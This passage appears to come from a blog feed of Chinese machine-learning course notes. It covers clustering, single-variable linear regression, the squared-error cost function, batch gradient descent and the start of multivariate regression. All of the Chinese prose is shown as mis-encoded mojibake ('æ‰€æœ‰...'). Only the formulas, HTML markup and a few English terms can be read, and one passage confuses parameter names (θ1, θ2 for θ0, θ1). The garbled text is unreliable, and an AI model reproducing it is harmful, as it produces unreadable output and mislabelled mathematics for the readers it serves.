<p>æ‰€æœ‰æ•°æ®åªæœ‰ç‰¹å¾å‘é‡æ²¡æœ‰æ ‡ç­¾ï¼Œä½†æ˜¯å¯ä»¥å‘ç°è¿™äº›æ•°æ®å‘ˆç°å‡ºèšç¾¤çš„ç»“æ„ï¼Œæœ¬è´¨æ˜¯ä¸€ä¸ªç›¸ä¼¼çš„ç±»å‹çš„ä¼šèšé›†åœ¨ä¸€èµ·ã€‚æŠŠè¿™äº›æ²¡æœ‰æ ‡ç­¾çš„æ•°æ®åˆ†æˆä¸€ä¸ªä¸€ä¸ªç»„åˆï¼Œå°±æ˜¯èšç±»ï¼ˆClusteringï¼‰ã€‚æ¯”å¦‚Googleæ–°é—»ï¼Œæ¯å¤©ä¼šæœé›†å¤§é‡çš„æ–°é—»ï¼Œç„¶åæŠŠå®ƒä»¬å…¨éƒ¨èšç±»ï¼Œå°±ä¼šè‡ªåŠ¨åˆ†æˆå‡ åä¸ªä¸åŒçš„ç»„ï¼ˆæ¯”å¦‚å¨±ä¹ï¼Œç§‘æŠ€ï¼Œæ”¿æ²»â€¦ï¼‰ï¼Œæ¯ä¸ªç»„å†…æ–°é—»éƒ½å…·æœ‰ç›¸ä¼¼çš„å†…å®¹ç»“æ„ã€‚</p>
<p>æ— ç›‘ç£å­¦ä¹ è¿˜æœ‰ä¸€ä¸ªå…¸å‹çš„ä¾‹å­å°±æ˜¯é¸¡å°¾é…’ä¼šé—®é¢˜ï¼ˆå£°éŸ³çš„åˆ†ç¦»ï¼‰ï¼Œåœ¨è¿™ä¸ªé…’ä¼šä¸Šæœ‰ä¸¤ç§å£°éŸ³ï¼Œè¢«ä¸¤ä¸ªä¸åŒçš„éº¦å…‹é£åœ¨ä¸åŒçš„åœ°æ–¹æ¥æ”¶åˆ°ï¼Œè€Œå¯ä»¥åˆ©ç”¨æ— ç›‘ç£å­¦ä¹ æ¥åˆ†ç¦»è¿™ä¸¤ç§ä¸åŒçš„å£°éŸ³ã€‚æ³¨æ„åˆ°è¿™é‡Œæ˜¯æ— ç›‘ç£å­¦ä¹ çš„åŸå› æ˜¯ï¼Œäº‹å…ˆå¹¶ä¸çŸ¥é“è¿™äº›å£°éŸ³ä¸­æœ‰å“ªäº›ç§ç±»ï¼ˆè¿™é‡Œçš„ç§ç±»å°±æ˜¯æ ‡ç­¾çš„æ„æ€ï¼‰ã€‚</p>
<h3 id="å•å˜é‡çº¿æ€§å›å½’">å•å˜é‡çº¿æ€§å›å½’</h3>
<p>ä»€ä¹ˆæ˜¯çº¿æ€§å›å½’æ¨¡å‹ï¼Ÿå›æƒ³ä¸€ä¸‹åœ¨å›å½’é—®é¢˜ä¸­ï¼Œæˆ‘ä»¬æ­£åœ¨ä½¿ç”¨è¾“å…¥å˜é‡ï¼Œå¹¶è¯•å›¾å°†è¾“å‡ºæ‹Ÿåˆåˆ°è¿ç»­çš„é¢„æœŸç»“æœå‡½æ•°ä¸­ã€‚</p>
<p>é‚£ä¹ˆï¼Œå…·æœ‰ä¸€ä¸ªå˜é‡çš„çº¿æ€§å›å½’ç§°ä¸ºâ€œå•å˜é‡çº¿æ€§å›å½’â€ï¼Œå³æ ¹æ®å•ä¸ªè¾“å…¥å€¼xé¢„æµ‹å•ä¸ªè¾“å‡ºå€¼yæ—¶ï¼Œä½¿ç”¨å•å˜é‡çº¿æ€§å›å½’ã€‚</p>
<h4 id="å‡è®¾å‡½æ•°ï¼ˆHypothesis-Functionï¼‰">å‡è®¾å‡½æ•°ï¼ˆHypothesis Functionï¼‰</h4>
<p>$$<br>
\hat{y} = h_\theta(x) = \theta_0 + \theta_1 x<br>
$$</p>
<p>çº¿æ€§å›å½’æ¨¡å‹çš„å‡è®¾å‡½æ•°å°±æ˜¯ä¸€ä¸ªä¸€å…ƒä¸€æ¬¡å¤šé¡¹å¼ï¼Œä»å‡ ä½•è§’åº¦æ¥è®²ï¼Œè¿™ä¸ªå‡½æ•°åœ¨åæ ‡è½´ä¸Šåæ˜ ä¸ºä¸€æ¡ç›´çº¿ï¼Œxæ˜¯è‡ªå˜é‡ï¼Œyæ˜¯å› å˜é‡ã€‚</p>
<p>ä¸¾ä¾‹æ¥è¯´ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:left">input x</th>
<th style="text-align:left">output y</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">0</td>
<td style="text-align:left">4</td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:left">7</td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:left">7</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:left">8</td>
</tr>
</tbody>
</table>
<p>æ ¹æ®è¡¨æ ¼ä¸­ç»™å®šçš„è¾“å…¥å’Œè¾“å‡ºï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹å‡è®¾å‡½æ•°ä¸ºï¼šh<sub>Î¸</sub>(<em>x</em>)=2+2<em>x</em></p>
<p>ä½†æ˜¯æˆ‘ä»¬xè¾“å…¥1çš„è¯ï¼Œyè¾“å‡ºæ˜¯4ï¼Œè¿™ä¸å®é™…ç»™å®šå€¼åå·®äº†3ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€ç»„æœ€åˆé€‚çš„Î¸1å’ŒÎ¸2æ¥æœ€ä½³æ‹Ÿåˆç»™å®šçš„æ•°æ®ã€‚</p>
<h4 id="ä»£ä»·å‡½æ•°ï¼ˆCost-Functionï¼‰">ä»£ä»·å‡½æ•°ï¼ˆCost Functionï¼‰</h4>
<p>æˆ‘ä»¬ä½¿ç”¨ä»£ä»·å‡½æ•°æ¥è¡¡é‡ä¸Šé¢ç»™å®šçš„å‡è®¾å‡½æ•°çš„ç²¾ç¡®æ€§ï¼Œè¿™å°†å‡è®¾çš„æ‰€æœ‰ç»“æœå–å¹³å‡å€¼ï¼ˆå®é™…ä¸Šæ˜¯å¹³å‡å€¼çš„ç®€åŒ–ç‰ˆæœ¬ï¼‰ï¼Œå…¶ä¸­å°†xçš„è¾“å…¥ä¸å®é™…è¾“å‡ºyçš„è¾“å…¥è¿›è¡Œæ¯”è¾ƒã€‚<br>
$$<br>
J(\theta_0, \theta_1) = \dfrac {1}{2m} \displaystyle \sum <em>{i=1}^m \left ( \hat{y}</em>{i}- y_{i} \right)^2  = \dfrac {1}{2m} \displaystyle \sum <em>{i=1}^m \left (h</em>\theta (x_{i}) - y_{i} \right)^2<br>
$$<br>
ç”¨ç¬¦å·<code>J</code>æ¥è¡¨ç¤ºä»£ä»·å‡½æ•°ï¼ŒæŠŠè¿™ä¸ªå‡½æ•°æ‹†å¼€æ¥çœ‹ä¸€ä¸‹ï¼š<br>
$$<br>
\sum <em>{i=1}^m \left (h</em>\theta (x_{i}) - y_{i} \right)^2<br>
$$<br>
i ä¸ºç¬¬ i ä¸ªæ•°æ®ï¼Œä¸Šå¼è¡¨ç¤ºæˆ‘é€šè¿‡æ‹Ÿåˆå‡½æ•° hÎ¸(x) å¾—åˆ°çš„ç¬¬ i ä¸ªæ•°æ®ä¸çœŸå®çš„ç¬¬ i ä¸ªæ•°æ®çš„è¯¯å·®ã€‚æ€»å…±æœ‰ m ä¸ªæ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åº”è¯¥æŠŠ m ä¸ªæ•°æ®çš„è¯¯å·®æ±‚å’Œç„¶åå†æ±‚å‡ºå¹³å‡è¯¯å·®ï¼Œå¾—åˆ°ä¸‹é¢è¿™ä¸ªå¼å­ã€‚<br>
$$<br>
\dfrac {1}{2m} \displaystyle \sum <em>{i=1}^m \left (h</em>\theta (x_{i}) - y_{i} \right)^2<br>
$$</p>
<blockquote>
<p>å…¶å®é™¤ä»¥ m æˆ– 2m ä»£ä»·å‡½æ•°æœ€ä¼˜åŒ–çš„ç»“æœéƒ½æ˜¯ç›¸åŒçš„ï¼Œè¿™é‡Œä¸ºäº†åç»­æ±‚å¯¼è®¡ç®—æ–¹ä¾¿ï¼Œå› æ­¤ç”¨ 2må¤„ç†ã€‚</p>
</blockquote>
<p>åªè¦æˆ‘è®©è¿™ä¸ªå€¼å°½å¯èƒ½çš„å°ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‰€åšçš„æ‹Ÿåˆå‡½æ•°å°±è¶Šå‡†ç¡®ï¼Œæ‰€ä»¥åˆšæ‰æ±‚æ‹Ÿåˆå‡½æ•°çš„é—®é¢˜å°±è½¬åŒ–æˆäº†é€šè¿‡ Î¸0 å’Œ Î¸1 æ±‚ J(Î¸0, Î¸1) çš„æœ€å°å€¼ï¼ŒåŠæœ€ä¼˜åŒ–é—®é¢˜ã€‚</p>
<p>è®²åˆ°è¿™é‡Œï¼Œæœ‰å¿…è¦å¯¹ä¸Šé¢çš„çŸ¥è¯†ç‚¹è¿›è¡Œä¸€äº›å°çš„æ€»ç»“ï¼š</p>
<ul>
<li>
<p>é¦–å…ˆç»™äº†ä¸€ä¸ªå‡è®¾å‡½æ•°ï¼š</p>
<p><strong>Hypothesis</strong>ï¼š</p>
</li>
</ul>
<p>$$<br>
\hat{y} = h_\theta(x) = \theta_0 + \theta_1 x<br>
$$</p>
<ul>
<li>
<p>ä»£ä»·å‡½æ•°ä¸­çš„Î¸0å’ŒÎ¸1æ˜¯ä»»æ„çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªå‡½æ•°æ¥åˆ¤æ–­è¿™ä¸ªå‡è®¾å‡½æ•°ä¸çœŸå®æ•°æ®ä¹‹é—´çš„æ‹Ÿåˆåº¦å¦‚ä½•ï¼Œä¸ºäº†æè¿°æ‹Ÿåˆåº¦ï¼Œæˆ‘ä»¬åˆæå‡ºäº†ä»£ä»·å‡½æ•°ï¼š<br>
$$<br>
J(\theta_0, \theta_1) = \dfrac {1}{2m} \displaystyle \sum <em>{i=1}^m \left ( \hat{y}</em>{i}- y_{i} \right)^2  = \dfrac {1}{2m} \displaystyle \sum <em>{i=1}^m \left (h</em>\theta (x_{i}) - y_{i} \right)^2<br>
$$</p>
</li>
<li>
<p>æˆ‘ä»¬çš„ç›®æ ‡å½“ç„¶æ˜¯ä»£ä»·å‡½æ•°çš„å€¼è¶Šå°è¶Šå¥½ï¼Œå³ç”¨æ•°å­¦å…¬å¼è¡¨ç¤ºä¸ºï¼š<br>
$$<br>
\min_{\theta_1,\theta_2} J(\theta_1,\theta_2)<br>
$$</p>
</li>
</ul>
<p>ä¸ºäº†è¯´æ˜ä»£ä»·å‡½æ•°æ˜¯å¦‚ä½•è¿›è¡Œå·¥ä½œçš„ï¼Œç°åœ¨æˆ‘ä»¬æ¥ç®€åŒ–ä¸€ä¸‹é—®é¢˜ï¼Œè®© Î¸0=0ï¼Œè¿™æ ·æˆ‘ä»¬è¦æ±‚çš„æ‹Ÿåˆå‡½æ•°å°±æ˜¯ä¸€æ¡è¿‡åŸç‚¹çš„ç›´çº¿ï¼Œå‚æ•°å°±å‰©ä¸‹ä¸€ä¸ª Î¸1ï¼ŒÎ¸1 ä»£è¡¨ç›´çº¿çš„æ–œç‡ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘æƒ³è¦æ‹Ÿåˆå·¦å›¾ä¸­çš„ 3 ä¸ªç‚¹ï¼Œæˆ‘å°±è¦å–ä¸åŒçš„å‚æ•° Î¸1 è¿›è¡Œå°è¯•ï¼ŒÎ¸1 å–å€¼ä¸åŒï¼Œç›´çº¿çš„é¢œè‰²ä¸åŒã€‚è¿™é‡Œ Î¸1 åˆ†åˆ«å– 0, 0.5, 1ï¼Œç›´çº¿çš„é¢œè‰²åˆ†åˆ«ä¸ºæ·±è“ã€ç´«è‰²å’Œæµ…è“è‰²ã€‚å¦‚ä½•ç¡®å®šå“ªæ¡ç›´çº¿æ‹Ÿåˆçš„æœ€å¥½å‘¢ï¼Œæˆ‘ä»¬å°±è¦æŠŠ Î¸1 çš„ä¸åŒå–å€¼å¸¦å…¥åˆ°ä»£ä»·å‡½æ•° J(Î¸1) ä¸­ï¼ˆå³å›¾ï¼‰ã€‚è¿™é‡Œæˆ‘ä»¬å°±å‘ç°ï¼Œå½“ Î¸1=1 æ—¶ï¼Œä»£ä»·å‡½æ•°å€¼æœ€å°ä¸º 0ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ‰¾åˆ°äº†æ‹Ÿåˆå‡½æ•° hÎ¸(x)= Î¸1x çš„æœ€ä½³å‚æ•° Î¸1=1ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025173354.png" alt=""></p>
<p>å¦‚æœæœ‰ä¸¤ä¸ªå‚æ•° Î¸0 å’Œ Î¸1ï¼Œé‚£ä¹ˆä»–ä»¬çš„ä»£ä»·å‡½æ•°å›¾åƒå°±æ˜¯ä¸€ä¸ªä¸‰ç»´å›¾åƒã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025175204.png" alt=""></p>
<p>ç”¨è½®å»“å›¾ç”»å‡ºæ¥çš„è¯å°±æ˜¯è¿™æ ·ï¼ˆè½®å»“å›¾ç±»ä¼¼äºç­‰é«˜çº¿å›¾ï¼‰</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025175316.png" alt=""></p>
<p>å³è¾¹çš„è½®å»“å›¾ä¸€åœˆå°±ç›¸å½“äºå·¦è¾¹çš„åŒä¸€æ¡ç›´çº¿ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025175514.png" alt=""></p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œè¶Šå¾€è½®å»“å›¾çš„ä¸­å¿ƒä½ç½®ç§»åŠ¨ï¼Œå‡è®¾å‡½æ•°ä¸çœŸå®æ•°æ®å°±æ›´åŠ æ‹Ÿåˆã€‚</p>
<p>å¦‚æœæ˜¯æ¯æ¬¡è¦æˆ‘ä»¬äººå·¥å»å¯»æ‰¾è¿™ä¸ªæœ€ä½ç‚¹ï¼Œæœªå…ä¹Ÿå¤ªä¸â€œäººå·¥æ™ºèƒ½â€äº†ã€‚ æœ‰æ²¡æœ‰ä¸€ç§ç®—æ³•å¯ä»¥è‡ªåŠ¨åœ°æ±‚å‡ºä½¿å¾—ä»£ä»·å‡½æ•°æœ€å°çš„ç‚¹å‘¢ï¼Ÿæœ‰ï¼Œé‚£å°±æ˜¯<strong>æ¢¯åº¦ä¸‹é™</strong>ã€‚ ï¼ˆåˆåˆ°äº†æœ€ä¼˜åŒ–çš„é—®é¢˜äº†ï¼‰</p>
<h3 id="æ¢¯åº¦ä¸‹é™ï¼ˆGradient-Descentï¼‰">æ¢¯åº¦ä¸‹é™ï¼ˆGradient Descentï¼‰</h3>
<p>**æ¢¯åº¦ä¸‹é™ï¼ˆGradient descentï¼‰**æ˜¯ä¸€ä¸ªç”¨æ¥æ±‚ä»£ä»·å‡½æ•°æœ€å°å€¼çš„ç®—æ³•ã€‚æ¢¯åº¦ä¸‹é™ç®—æ³•çš„æ€æƒ³å°±æ˜¯é¦–å…ˆå…ˆä»ä¸€ç»„å‚æ•°å€¼ï¼ˆÎ¸0, Î¸1ï¼‰å¼€å§‹ï¼Œä¸æ–­åœ°å»å°è¯•å„ç§ï¼ˆÎ¸0, Î¸1ï¼‰ï¼Œç›´åˆ°ä½¿å¾—ä»£ä»·å‡½æ•° J(Î¸0, Î¸1) æœ€å°ä¸ºæ­¢ã€‚ä»¥ä¸‹å›¾ä»£ä»·å‡½æ•°ä¸ºä¾‹ï¼Œä»ä¸åŒèµ·å§‹ç‚¹å¼€å§‹ï¼Œåˆ°è¾¾çš„å±€éƒ¨æœ€ä¼˜ä½ç½®ä¸åŒï¼Œä¹Ÿå°±æ˜¯å±€éƒ¨æœ€ä¼˜è§£ä¸åŒã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025180157.png" alt=""></p>
<p>æ¢¯åº¦ä¸‹é™ç®—æ³•ç”¨ä»¥ä¸‹ä¼ªä»£ç è¡¨ç¤ºï¼š</p>
<p>repeat until convergence:<br>
$$<br>
\theta_j := \theta_j - \alpha \frac{\partial}{\partial \theta_j} J(\theta_0, \theta_1)<br>
$$<br>
å…·ä½“åº”ç”¨åˆ°çº¿æ€§å›å½’ç®—æ³•å½“ä¸­ï¼Œç®—æ³•è¡¨ç°ä¸ºï¼šï¼ˆä¹Ÿå°±æ˜¯æŠŠä»£ä»·å‡½æ•°ä»£å…¥ä¸Šå¼ä¸­ï¼‰</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025181247.png" alt=""></p>
<p>åœ¨æ¯ä¸€æ¬¡è¿­ä»£çš„è¿‡ç¨‹ä¸­ï¼Œ<strong>å¿…é¡»åŒæ—¶æ›´æ–°Î¸0å’ŒÎ¸1çš„å€¼</strong>ï¼Œå³ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025181749.png" alt=""></p>
<p>å†ç¨å¾®è§£é‡Šä¸€ä¸‹è¿™ä¸ªç®—æ³•ï¼š</p>
<p>é¦–å…ˆæ˜¯ä¸€ä¸ªå¾ªç¯ç»“æ„ï¼Œå½“ä¸èƒ½å†æ›´æ–°Î¸0, Î¸1æ—¶å¾ªç¯åœæ­¢ï¼Œ<code>:=</code>æ˜¯ä¸€ä¸ªèµ‹å€¼å·ï¼Œ<code>Î±</code>æ˜¯å­¦ä¹ é€Ÿç‡ï¼Œä¹Ÿå°±æ˜¯ä¸‹å±±æ¯æ¬¡è¿ˆå‡ºå¤šå¤§æ­¥å­ï¼Œåé¢ç´§è·Ÿç€çš„æ˜¯ä¸€ä¸ªåå¯¼æ•°ã€‚ ç”¨å‡ ä½•å›¾å½¢æ¥è§£é‡Šæ˜¾å¾—æ›´ä¸ºç›´è§‚ï¼Œä¸å¦¨è®¾Î¸0=0ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025182246.png" alt=""></p>
<p>å…¶ä¸­ Î± åé¢çš„å¯¼æ•°å°±ä»£è¡¨ç€è¿™ä¸€ç‚¹çš„æ–œç‡ï¼Œæ¯æ¬¡ Î¸1 æ›´æ–°éƒ½æ˜¯å‡å»ä¸€ä¸ª Î±ä¸è¯¥ç‚¹çš„æ–œç‡ä¹‹ç§¯ï¼Œå½“ä¸‹é™åˆ°å±€éƒ¨æœ€å°å¤„æ—¶ï¼Œå¯¼æ•°æ°å¥½ä¸ºé›¶ï¼Œæ­¤æ—¶ Î¸1 ä¸å†æ›´æ–°ï¼Œå°±å¾—åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„ç»“æœ ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025182401.png" alt=""></p>
<p>å¯¹äºÎ±çš„å–å€¼è¿˜æ˜¯æ¯”è¾ƒè®²ç©¶çš„ï¼Œå¦‚æœÎ±å¤ªå¤§ï¼Œ ä¼šå‡ºç°ä¸‹å›¾ä¸­çš„æƒ…å†µï¼Œç›´æ¥è·³è¿‡å±€éƒ¨æœ€ä¼˜è§£ï¼Œä¸€ç›´å¾ªç¯ï¼Œè€Œä¸”ç¦»å±€éƒ¨æœ€ä¼˜è§£ä¼šè¶Šæ¥è¶Šè¿œã€‚å¦‚æœÎ±å¤ªå°ï¼Œå¯»æ‰¾å±€éƒ¨æœ€ä¼˜è§£çš„é€Ÿç‡ä¼šç‰¹åˆ«ç‰¹åˆ«æ…¢ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025182534.png" alt=""></p>
<h3 id="çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™ç®—æ³•">çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™ç®—æ³•</h3>
<p>åˆ°ç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»å­¦è¿‡äº†çº¿æ€§<strong>å›å½’æ¨¡å‹</strong>ã€<strong>ä»£ä»·å‡½æ•°</strong>å’Œ<strong>æ¢¯åº¦ä¸‹é™</strong>ï¼Œè¿™ä¸‰ä¸ªç®—æ³•å°±å¯ä»¥ç»„æˆæˆ‘ä»¬ä»Šå¤©è¦å­¦åˆ°çš„ç¬¬ä¸€ä¸ªæœºå™¨å­¦ä¹ ç®—æ³•ï¼š<strong>çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™ç®—æ³• ï¼ˆGradient Descent For Linear Regressionï¼‰</strong></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191030105814.png" alt=""></p>
<p>å·¦è¾¹æ˜¯æ¢¯åº¦ä¸‹é™ç®—æ³•ï¼Œå³è¾¹æ˜¯çº¿æ€§å›å½’æ¨¡å‹å’Œä»£ä»·å‡½æ•°ã€‚</p>
<p>åˆ†åˆ«æ±‚å‡º j=0 å’Œ j=1 æ—¶ä»£ä»·å‡½æ•°çš„åå¯¼æ•°ï¼š<br>
$$<br>
\frac{\partial}{\partial \theta_0} J(\theta_0, \theta_1)=\dfrac {1}{m} \displaystyle \sum <em>{i=1}^m \left (h</em>\theta (x^{(i)}) - y^{(i)} \right)<br>
$$<br>
å’Œ<br>
$$<br>
\frac{\partial}{\partial \theta_1} J(\theta_0, \theta_1)=\dfrac {1}{m} \displaystyle \sum <em>{i=1}^m \left ((h</em>\theta (x^{(i)}) - y^{(i)} \right)x^{(i)}<br>
$$<br>
é‚£ä¹ˆï¼ŒæŠŠä¸€èˆ¬æ€§çš„æ¢¯åº¦ä¸‹é™ç®—æ³•åº”ç”¨åˆ°çº¿æ€§å›å½’æ¨¡å‹çš„æ—¶å€™ï¼Œå°±å¯ä»¥å¾—å‡ºä¸€ä¸ªæ–°çš„å…·ä½“å½¢å¼ï¼š<br>
$$<br>
\begin{align*} \text{repeat until convergence: } \lbrace &amp; \newline \theta_0 := &amp; \theta_0 - \alpha \frac{1}{m} \sum\limits_{i=1}^{m}(h_\theta(x_{i}) - y_{i}) \newline \theta_1 := &amp; \theta_1 - \alpha \frac{1}{m} \sum\limits_{i=1}^{m}\left((h_\theta(x_{i}) - y_{i}) x_{i}\right) \newline \rbrace&amp; \end{align*}<br>
$$<br>
è¿™ä¸ªç®—æ³•ä¹Ÿå«åš<strong>æ‰¹é‡æ¢¯åº¦ä¸‹é™ï¼ˆBatch Gradient Descent ï¼‰</strong>ï¼Œä»–çš„ç‰¹ç‚¹å°±æ˜¯æ¯æ¬¡è¿›è¡Œæ¢¯åº¦ä¸‹é™éƒ½è¦ä½¿ç”¨æ•´ä¸ªæ•°æ®é›†ã€‚</p>
]]></content>
      <categories>
        <category>æœºå™¨å­¦ä¹ </category>
        <category>åŸºç¡€å…¥é—¨</category>
      </categories>
      <tags>
        <tag>æœºå™¨å­¦ä¹ </tag>
        <tag>çº¿æ€§å›å½’</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine-Learning-Week2</title>
    <url>/Machine_learning/basic_learning/2.Machine-Learning-Week2/</url>
    <content><![CDATA[<h1 id="Machine-Learning-Week2">Machine-Learning-Week2</h1>
<h3 id="å¤šå…ƒçº¿æ€§å›å½’">å¤šå…ƒçº¿æ€§å›å½’</h3>
<p>åœ¨ä¸Šä¸€å‘¨æˆ‘ä»¬å­¦äº†å•å˜é‡çº¿æ€§å›å½’æ–¹ç¨‹åŠå…¶æ¢¯åº¦ä¸‹é™ç®—æ³•ã€‚ä½†åœ¨å®é™…è¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œç‰¹å¾è‚¯å®šæ˜¯å¤šæ ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ ¹æ®å•å˜é‡çº¿æ€§å›å½’æ–¹ç¨‹æ¨æ¼”å‡ºå¤šå…ƒçº¿æ€§å›å½’æ–¹ç¨‹ã€‚æ¯”å¦‚è¯´ï¼Œä¸€ä¸ªäºŒæ‰‹æˆ¿çš„ä»·æ ¼å¯èƒ½ä¼šç”±æˆ¿å±‹é¢ç§¯ï¼ˆSizeï¼‰ã€æˆ¿é—´æ•°é‡ï¼ˆNumber of bedroomsï¼‰ã€æ¥¼å±‚æ•°ï¼ˆNumber of floorï¼‰ã€æˆ¿å±‹å¹´é™ï¼ˆAge of homeï¼‰è¿™å››ä¸ªç‰¹å¾å†³å®šï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191031143745.png" alt=""></p>
<p>x<sup>(i)</sup>è¡¨ç¤ºç¬¬iæ¡è®­ç»ƒæ ·æœ¬ï¼Œx<sup>(i)</sup><sub>j</sub>è¡¨ç¤ºç¬¬iæ¡è®­ç»ƒæ ·æœ¬çš„ç¬¬jä¸ªç‰¹å¾ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¾—åˆ°çš„çº¿æ€§å›å½’å‡½æ•°ä¸ºï¼š<br>
$$<br>
h_\theta (x) = \theta_0 + \theta_1 x_1 + \theta_2 x_2 + \theta_3 x_3 + \cdots + \theta_n x_n<br>
$$<br>
å¦‚æœæŠŠè¯¥å‡½æ•°çš„å‚æ•° Î¸ å’Œå˜é‡ x å…¨éƒ¨å†™æˆå‘é‡çš„å½¢å¼ï¼Œå¹¶ä¸”ä¸å¦¨å‡è®¾<code>x0=1</code>å°±å¯ä»¥ç®€åŒ–æˆä¸‹é¢è¿™ä¸ªå‡½æ•°ï¼š<br>
$$<br>
\begin{align*}h_\theta(x) =\begin{bmatrix}\theta_0 \hspace{2em}  \theta_1 \hspace{2em}  â€¦  \hspace{2em}  \theta_n\end{bmatrix}\begin{bmatrix}x_0 \newline x_1 \newline \vdots \newline x_n\end{bmatrix}= \theta^T x\end{align*}<br>
$$<br>
è¿›ä¸€æ­¥æ¥è®²ï¼Œå¦‚æœæˆ‘ä»¬æŠŠä¸Šå›¾çš„è®­ç»ƒæ ·æœ¬é€è¡Œçš„å†™åˆ°çŸ©é˜µå½“ä¸­ï¼Œä¸”è®°ä¸ºXï¼Œå³ï¼ˆå‡è®¾åªæœ‰ä¸‰æ¡æ•°æ®ï¼‰ï¼š<br>
$$<br>
\begin{align*}X = \begin{bmatrix}x^{(1)}_0 &amp; x^{(1)}_1 &amp; x^{(1)}_2 &amp; x^{(1)}_3 &amp; x^{(1)}_4  \newline x^{(2)}_0 &amp; x^{(2)}_1 &amp; x^{(2)}_2 &amp; x^{(2)}_3 &amp; x^{(2)}_4  \newline x^{(3)}_0 &amp; x^{(3)}_1 &amp; x^{(3)}_2 &amp; x^{(3)}_3 &amp; x^{(3)}_4 \end{bmatrix}&amp;,\theta = \begin{bmatrix}\theta_0 \newline \theta_1 \newline \theta_2 \newline \theta_3 \newline \theta_4 \newline\end{bmatrix}\end{align*}<br>
$$<br>
é‚£ä¹ˆå‡è®¾å‡½æ•°å°±å¯ä»¥å†™ä¸ºï¼š</p>
<p>h<sub>Î¸</sub>(X)=XÎ¸</p>
<p>å¾—åˆ°çš„ç»“æœå°±æ˜¯ä¸€ä¸ªm*1çš„å‘é‡ã€‚</p>
<h4 id="å¤šå…ƒæ¢¯åº¦ä¸‹é™">å¤šå…ƒæ¢¯åº¦ä¸‹é™</h4>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191031170034.png" alt=""></p>
<p>ä¸Šä¸€ç¯‡å­¦ä¼šäº†å•å˜é‡çš„æ¢¯åº¦ä¸‹é™ç®—æ³•ï¼Œå¯¹äºå¤šå…ƒæ¢¯åº¦ä¸‹é™ç®—æ³•ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªç…§è‘«èŠ¦ç”»ç“¢çš„è¿‡ç¨‹äº†ï¼š<br>
$$<br>
\begin{align*}<br>
&amp; \text{repeat until convergence:} ; \lbrace \newline<br>
; &amp; \theta_0 := \theta_0 - \alpha \frac{1}{m} \sum\limits_{i=1}^{m} (h_\theta(x^{(i)}) - y^{(i)}) \cdot x_0^{(i)}\newline<br>
; &amp; \theta_1 := \theta_1 - \alpha \frac{1}{m} \sum\limits_{i=1}^{m} (h_\theta(x^{(i)}) - y^{(i)}) \cdot x_1^{(i)} \newline<br>
; &amp; \theta_2 := \theta_2 - \alpha \frac{1}{m} \sum\limits_{i=1}^{m} (h_\theta(x^{(i)}) - y^{(i)}) \cdot x_2^{(i)} \newline<br>
&amp; \cdots<br>
\newline \rbrace<br>
\end{align*}<br>
$$<br>
å³ï¼š<br>
$$<br>
\begin{align*}&amp; \text{repeat until convergence:} ; \lbrace \newline ; &amp; \theta_j := \theta_j - \alpha \frac{1}{m} \sum\limits_{i=1}^{m} (h_\theta(x^{(i)}) - y^{(i)}) \cdot x_j^{(i)} ;  &amp; \text{for j := 0â€¦n}\newline \rbrace\end{align*}<br>
$$</p>
<h4 id="ç‰¹å¾æ”¾ç¼©å’Œå½’ä¸€åŒ–">ç‰¹å¾æ”¾ç¼©å’Œå½’ä¸€åŒ–</h4>
